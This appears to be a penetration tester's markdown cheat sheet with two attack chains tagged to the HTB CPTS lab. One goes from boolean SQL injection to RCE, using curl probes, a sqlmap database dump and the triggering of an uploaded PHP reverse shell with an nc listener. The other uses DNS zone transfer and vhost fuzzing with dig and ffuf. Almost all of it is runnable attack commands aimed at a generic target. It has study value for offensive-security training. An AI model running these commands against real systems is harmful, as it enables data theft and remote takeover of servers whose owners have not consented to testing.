# Web – SQL Injection to RCE

### Boolean SQLi to Extract File Path → Direct RCE (HTB CPTS) [added: 2026-04]
- **Tags:** #SQLi #BooleanSQLi #sqlmap #MySQL #RCE #FileUpload #WebShell #PHP
- **Trigger:** SQLi confirmed on web app with file download/upload functionality and MySQL backend
- **Prereq:** Confirmed SQL injection (boolean-based) + MySQL backend + file upload or known writable web directory
- **Yields:** Remote code execution via webshell after extracting real file paths from the database
- **Opsec:** Med
- **Context:** File download endpoint with Boolean-based SQLi in UUID parameter. DB stores real file path. Upload PHP webshell, get path via SQLi, execute it.
- **Payload/Method:**
```bash
# Step 1: Confirm Boolean SQLi
curl "http://target/download.php?file=UUID'+AND+1=1--+-"   # → normal
curl "http://target/download.php?file=UUID'+AND+1=0--+-"   # → "File does not exist"

# Step 2: Use sqlmap to dump real file paths from DB
sqlmap -u 'http://target/download.php?file=<UUID>' --dbms mysql -p file --technique='B' \
  -D securetransfer --dump --threads 10 --batch
# Gets: real_path = /var/www/html/storage/2_UUID.php

# Step 3: Upload PHP reverse shell, then access it via real path
curl http://target/storage/2_UUID.php   # triggers reverse shell
# Listener: nc -lnvp 4444
```

### DNS Zone Transfer → Vhost Discovery → Web Attack Chain (HTB CPTS) [added: 2026-04]
- **Tags:** #DNS #ZoneTransfer #AXFR #VhostEnum #ffuf #Recon #SubdomainDiscovery #dig
- **Trigger:** DNS server (port 53) exposed on target and responds to zone transfer requests
- **Prereq:** DNS server accessible + zone transfer (AXFR) allowed for the target domain
- **Yields:** Discovery of internal virtual hosts and subdomains, expanding the web attack surface
- **Opsec:** Low
- **Context:** DNS server exposed. Zone transfer reveals internal vhosts. Each vhost may have a different attack surface.
- **Payload/Method:**
```bash
# DNS zone transfer
dig axfr trilocor.local @<TARGET_IP>

# Add discovered vhosts to /etc/hosts
echo "<IP> trilocor.local dev.trilocor.local blog.trilocor.local admin.trilocor.local" >> /etc/hosts

# Enumerate each vhost for hidden paths
ffuf -w /usr/share/wordlists/dirb/small.txt -u http://dev.trilocor.local/FUZZ
```
